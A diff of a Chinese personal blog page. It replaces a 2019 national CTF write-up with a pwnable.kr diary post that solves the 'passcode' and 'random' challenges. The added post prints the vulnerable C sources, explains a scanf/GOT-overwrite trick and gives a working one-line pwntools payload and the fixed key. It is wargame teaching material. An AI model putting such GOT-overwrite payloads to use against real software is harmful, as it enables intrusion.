@@ -96,39 +96,18 @@
 
 
 
-  <meta name="description" content="​    人生中第一次参加信安国赛……之前是偶尔打打CTF的菜鸡，不太知道自己的斤两，这次国赛让我见识到什么是神仙打架。 ​    比较菜，没做出几道题，写个wp，权当自己复习纪念。 ​    不够啊，还要努力。  签到下载题目花了5分钟（即使我是尊贵的百度云vip会员）。突然榜上一分钟内就有大佬做出来了？（一定是我钱充得不够） 拿到题目一看，三人行，必有flag。打开题目，一个摄像头，可以捕捉">
-<meta name="keywords" content="CTF">
+  <meta name="description" content="[passcode]12345678910111213141516171819202122232425262728293031323334353637383940414243#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void login()&amp;#123;        int passcode1;        int passcode2;">
+<meta name="keywords" content="blog">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2019信安国赛部分wp">
-<meta property="og:url" content="https://stega.cn/2018/11/19/2019信安国赛部分writeup/index.html">
+<meta property="og:title" content="lpc的pwnable.kr日记(2)">
+<meta property="og:url" content="https://stega.cn/2019/06/28/lpc的pwnable-kr日记-2/index.html">
 <meta property="og:site_name" content="Curled">
-<meta property="og:description" content="​    人生中第一次参加信安国赛……之前是偶尔打打CTF的菜鸡，不太知道自己的斤两，这次国赛让我见识到什么是神仙打架。 ​    比较菜，没做出几道题，写个wp，权当自己复习纪念。 ​    不够啊，还要努力。  签到下载题目花了5分钟（即使我是尊贵的百度云vip会员）。突然榜上一分钟内就有大佬做出来了？（一定是我钱充得不够） 拿到题目一看，三人行，必有flag。打开题目，一个摄像头，可以捕捉">
+<meta property="og:description" content="[passcode]12345678910111213141516171819202122232425262728293031323334353637383940414243#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void login()&amp;#123;        int passcode1;        int passcode2;">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://stega.cn/2018/11/19/2019信安国赛部分writeup/qd.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image%20%5B1%5D.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image%20%5B2%5D.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image%20%5B3%5D.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image%20%5B4%5D.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/puz1.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/mat2.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/pz3.jpg">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/pz4.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/pz5.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/saleae1.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/saleae2.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/sa2.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/sa3.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb3.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb2.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb4.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb5.png">
-<meta property="og:image" content="c:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb1.png">
-<meta property="og:updated_time" content="2019-04-22T16:25:44.841Z">
+<meta property="og:updated_time" content="2019-06-28T10:46:49.593Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2019信安国赛部分wp">
-<meta name="twitter:description" content="​    人生中第一次参加信安国赛……之前是偶尔打打CTF的菜鸡，不太知道自己的斤两，这次国赛让我见识到什么是神仙打架。 ​    比较菜，没做出几道题，写个wp，权当自己复习纪念。 ​    不够啊，还要努力。  签到下载题目花了5分钟（即使我是尊贵的百度云vip会员）。突然榜上一分钟内就有大佬做出来了？（一定是我钱充得不够） 拿到题目一看，三人行，必有flag。打开题目，一个摄像头，可以捕捉">
-<meta name="twitter:image" content="https://stega.cn/2018/11/19/2019信安国赛部分writeup/qd.png">
+<meta name="twitter:title" content="lpc的pwnable.kr日记(2)">
+<meta name="twitter:description" content="[passcode]12345678910111213141516171819202122232425262728293031323334353637383940414243#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void login()&amp;#123;        int passcode1;        int passcode2;">
 
 
 
@@ -136,7 +115,7 @@
 
   
   
-  <link rel="canonical" href="https://stega.cn/2018/11/19/2019信安国赛部分writeup/">
+  <link rel="canonical" href="https://stega.cn/2019/06/28/lpc的pwnable-kr日记-2/">
 
 
 
@@ -146,7 +125,7 @@
   };
 </script>
 
-  <title>2019信安国赛部分wp | Curled</title>
+  <title>lpc的pwnable.kr日记(2) | Curled</title>
   
 
 
@@ -267,7 +246,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives<span class="badge">8</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives<span class="badge">10</span></a>
 
   </li>
 
@@ -326,7 +305,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://stega.cn/2018/11/19/2019信安国赛部分writeup/">
+    <link itemprop="mainEntityOfPage" href="https://stega.cn/2019/06/28/lpc的pwnable-kr日记-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Curled">
@@ -343,7 +322,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2019信安国赛部分wp
+          <h1 class="post-title" itemprop="name headline">lpc的pwnable.kr日记(2)
 
               
             
@@ -369,24 +348,12 @@
                 
               
 
-              <time title="Created: 2018-11-19 01:16:40" itemprop="dateCreated datePublished" datetime="2018-11-19T01:16:40+08:00">2018-11-19</time>
+              <time title="Created: 2019-06-28 16:36:55 / Modified: 18:46:49" itemprop="dateCreated datePublished" datetime="2019-06-28T16:36:55+08:00">2019-06-28</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-04-23 00:25:44" itemprop="dateModified" datetime="2019-04-23T00:25:44+08:00">2019-04-23</time>
               
             
           </span>
@@ -404,8 +371,8 @@
                 </span>
             
                 <span class="post-meta-item-text">Comments: </span>
-                <a href="/2018/11/19/2019信安国赛部分writeup/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/19/2019信安国赛部分writeup/" itemprop="commentCount"></span>
+                <a href="/2019/06/28/lpc的pwnable-kr日记-2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/06/28/lpc的pwnable-kr日记-2/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -440,58 +407,19 @@
       
 
       
-        <blockquote>
-<p>​    人生中第一次参加信安国赛……之前是偶尔打打CTF的菜鸡，不太知道自己的斤两，这次国赛让我见识到什么是神仙打架。</p>
-<p>​    比较菜，没做出几道题，写个wp，权当自己复习纪念。</p>
-<p>​    不够啊，还要努力。</p>
-</blockquote>
-<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>下载题目花了5分钟（即使我是尊贵的百度云vip会员）。突然榜上一分钟内就有大佬做出来了？（一定是我钱充得不够）</p>
-<p>拿到题目一看，三人行，必有flag。打开题目，一个摄像头，可以捕捉脸部（出现小框框的那种），联想到三人行，就三个人一起看摄像头。当时比较simple，把控制台最小化了，弄半天没反应，最后气急败坏要关闭题目的时候，看见控制台里的flag。</p>
-<p><img src=".\qd.png" alt="qd"></p>
-<p>签到完成。</p>
-<h1 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h1><p>这题一开始以为是简单题，太乐观了。直接栈溢出后。。。额，就找不到可以利用的点了，找不到system、write，找不到int 80 gadget，无从下手。打算直接给read加上libc的system偏移，尝试一波后放弃。然后在网上找了找解决方案好久，看到一道类似的题，是2017年的文章，（<a href="https://veritas501.space/2017/04/23/32位下花样read_write/" target="_blank" rel="noopener">https://veritas501.space/2017/04/23/32%E4%BD%8D%E4%B8%8B%E8%8A%B1%E6%A0%B7read_write/</a>）是说把got表里的read低字节覆盖成syscall地址，然后看大概的代码结构也和题给的差不多，似乎出题人就是把这道题稍微改了一下。然后我复现了一下这道题，整个跳csu_init，写bin/sh，跳plt_read的过程还好，就最后一个覆盖低字节\xdc很迷。</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image.png" alt="Image"></p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image%20%5B1%5D.png" alt="Image [1]"></p>
-<p>以为偏移指的是函数间的偏移，发现偏移都差距好大，觉得是libc不同的过。好久才醒悟过来syscall的偏移是在read函数内的，然后就确定偏移的确是\xdc了，然后就是把eax、ebx的相应参数都设置好，用两个gadget。之后以为能成功，但本地一直报段错误，不知道为啥。想碰碰运气试远程结果成功了。</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image%20%5B2%5D.png" alt="Image [2]"></p>
-<p>写的脚本：</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image%20%5B3%5D.png" alt="Image [3]"></p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/Image%20%5B4%5D.png" alt="Image [4]"></p>
-<h1 id="puzzles"><a href="#puzzles" class="headerlink" title="puzzles"></a>puzzles</h1><p>根据likes提示格式，我们开始一步一步地解。</p>
-<p>question0是一个一元多阶多项式方程组，不多说，上matlab：</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/puz1.png" alt="puz1"></p>
-<p>question1发现都是奇数，等比数列无果后操作了一波发现是质数。于是，依然matlab：</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/mat2.png" alt="mat2"></p>
-<p>发现是不连续的质数，然后查看了一波质数的位置，发现第一个在1645834位，第三个在1645908，第四个在1645945，等差数列，于是第三个质数为1645908。</p>
-<p>question2依然matlab：</p>
-<p>定积分公式</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/pz3.jpg" alt="pz3"></p>
-<p>question3物理题</p>
-<p>网上找到了原题，改下数字，带公式计算。</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/pz4.png" alt="pz4"></p>
-<p>question4数学题</p>
-<p>依然matlab：</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/pz5.png" alt="pz5"></p>
-<p>最后把几个part转换成16进制，拼接起来，得到flag</p>
-<h1 id="saleae"><a href="#saleae" class="headerlink" title="saleae"></a>saleae</h1><p>下载下来是一个logicdata后缀的文件，不知道的后缀名先百度一波。发现有这样一篇文章（<a href="https://www.waitalone.cn/security-hardware-usb.html" target="_blank" rel="noopener">https://www.waitalone.cn/security-hardware-usb.html</a>），发现要用到一个叫saleae logic的软件，再联想到题目，就很顺理成章了。</p>
-<p>去官网下载一波，打开，发现是三个波形，一开始我们以为是条形码。</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/saleae1.png" alt="saleae1"></p>
-<p>于是就开始疯狂的扫扫扫，然鹅：</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/saleae2.png" alt="saleae2"></p>
-<p>后来仔细观察了下波形：</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/sa2.png" alt="sa2"></p>
-<p>channel0这规律的波形，这熟悉的律动。联想到学过的数电的时钟信号 ，想到了时序分析。所以analyze采用SPI时序分析。时钟设为channel0，使能端用channel3，channel1没有起伏可以不用管，channel0是被分析的所以设为MOSI，于是乎：</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/sa3.png" alt="sa3"></p>
-<p>右下角得到分析结果，0x66是字符‘f’，0x6c是字符‘l’，flag出来了。</p>
-<h1 id="usbasp"><a href="#usbasp" class="headerlink" title="usbasp"></a>usbasp</h1><h4 id="操作内容"><a href="#操作内容" class="headerlink" title="操作内容"></a><strong>操作内容</strong></h4><p>有了昨天物联网那道题的经验，依旧用saleae打开。</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb3.png" alt="usb3"></p>
-<p>channel2放大后看起来比较有规律。尝试用channel2做时钟端口，channel1和0做被分析，channel3做使能端。发现好像不行</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb2.png" alt="usb2"></p>
-<p>然后看到题目，联想到用usb协议，发现依旧不行。</p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb4.png" alt="usb4"></p>
-<p>然后抱着试一试的心态和认定0x66和0x6c的心态去试了下每个协议，终于，在时序分析spi时，把使能端的设置改一下<img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb5.png" alt="usb5"></p>
-<p><img src="C:/Users/Curled/Desktop/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9Bwp/usb1.png" alt="usb1"></p>
-<p>然后惊喜地发现了0x66，于是转换一下，即得flag。</p>
+        <h3 id="passcode"><a href="#passcode" class="headerlink" title="[passcode]"></a>[passcode]</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void login()&#123;</span><br><span class="line">        int passcode1;</span><br><span class="line">        int passcode2;</span><br><span class="line"></span><br><span class="line">        printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, passcode1);</span><br><span class="line">        fflush(stdin);</span><br><span class="line"></span><br><span class="line">        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br><span class="line">        printf(&quot;enter passcode2 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, passcode2);</span><br><span class="line"></span><br><span class="line">        printf(&quot;checking...\n&quot;);</span><br><span class="line">        if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;</span><br><span class="line">                printf(&quot;Login OK!\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">                printf(&quot;Login Failed!\n&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void welcome()&#123;</span><br><span class="line">        char name[100];</span><br><span class="line">        printf(&quot;enter you name : &quot;);</span><br><span class="line">        scanf(&quot;%100s&quot;, name);</span><br><span class="line">        printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        printf(&quot;Toddler&apos;s Secure Login System 1.0 beta.\n&quot;);</span><br><span class="line"></span><br><span class="line">        welcome();</span><br><span class="line">        login();</span><br><span class="line"></span><br><span class="line">        // something after login...</span><br><span class="line">        printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题主要包含两个知识点：</p>
+<p>1.scanf不加取地址符的时候，如果后面那个参数不是地址型的参数，那么就从栈中读取4个字节作为scanf取的地址。</p>
+<p>2.GOT表覆写。关于GOT表覆写，大佬的这篇文章已经讲得很清楚了：<a href="https://blog.csdn.net/smalosnail/article/details/53247502" target="_blank" rel="noopener">https://blog.csdn.net/smalosnail/article/details/53247502</a></p>
+<p>关于GOT表的知识，见这位dalao的博客：</p>
+<p><a href="https://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="noopener">https://blog.csdn.net/linyt/article/details/51635768</a></p>
+<p>解题思路就是，把GOT表中某个函数的地址写进栈中，以充当scanf的地址，写入的内容是system函数的地址，在该函数运行的时候，调用system函数。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passcode@prowl:~$ python -c &quot;from pwn import *;payload = &apos;A&apos; * 96 + p32(0x0804a000) + str(0x80485e3);print(payload)&quot; | .</span><br><span class="line">/passcode</span><br></pre></td></tr></table></figure>
+<p>Toddler’s Secure Login System 1.0 beta.<br>enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!<br>Sorry mom.. I got confused about scanf usage :(<br>enter passcode1 : Now I can safely trust you that you have credential :)</p>
+<h3 id="random"><a href="#random" class="headerlink" title="[random]"></a>[random]</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	unsigned int random;</span><br><span class="line">	random = rand();	// random value!</span><br><span class="line"></span><br><span class="line">	unsigned int key=0;</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line"></span><br><span class="line">	if( (key ^ random) == 0xdeadbeef )&#123;</span><br><span class="line">		printf(&quot;Good!\n&quot;);</span><br><span class="line">		system(&quot;/bin/cat flag&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解题关键：利用伪随机数rand()初始化时不设种子，每次都是同一个值的特点。</p>
+<p>random@prowl:~$ ./random<br>3039230856<br>Good!<br>Mommy, I thought libc random is unpredictable…</p>
 
       
     </div>
@@ -513,12 +441,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
-          
-        </div>
-      
 
       
       
@@ -528,8 +450,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/19/旧曾谙/" rel="next" title="旧曾谙">
-                <i class="fa fa-chevron-left"></i> 旧曾谙
+              <a href="/2019/06/27/lpc的pwnable日记-1/" rel="next" title="lpc的pwnable.kr日记(1)">
+                <i class="fa fa-chevron-left"></i> lpc的pwnable.kr日记(1)
               </a>
             
           </div>
@@ -537,10 +459,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/14/我与Lamp模式建站的恩怨情仇/" rel="prev" title="我与Lamp模式建站的恩怨情仇">
-                我与Lamp模式建站的恩怨情仇 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -615,7 +533,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-count">10</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -687,8 +605,7 @@
 
           
           
-
-          
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=35345004&auto=1&height=66"></iframe>          
             
           
           
@@ -707,7 +624,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#签到"><span class="nav-number">1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babypwn"><span class="nav-number">2.</span> <span class="nav-text">babypwn</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#puzzles"><span class="nav-number">3.</span> <span class="nav-text">puzzles</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#saleae"><span class="nav-number">4.</span> <span class="nav-text">saleae</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#usbasp"><span class="nav-number">5.</span> <span class="nav-text">usbasp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#操作内容"><span class="nav-number">5.0.0.1.</span> <span class="nav-text">操作内容</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#passcode"><span class="nav-number">1.</span> <span class="nav-text">[passcode]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#random"><span class="nav-number">2.</span> <span class="nav-text">[random]</span></a></li></ol></div>
             
 
           </div>
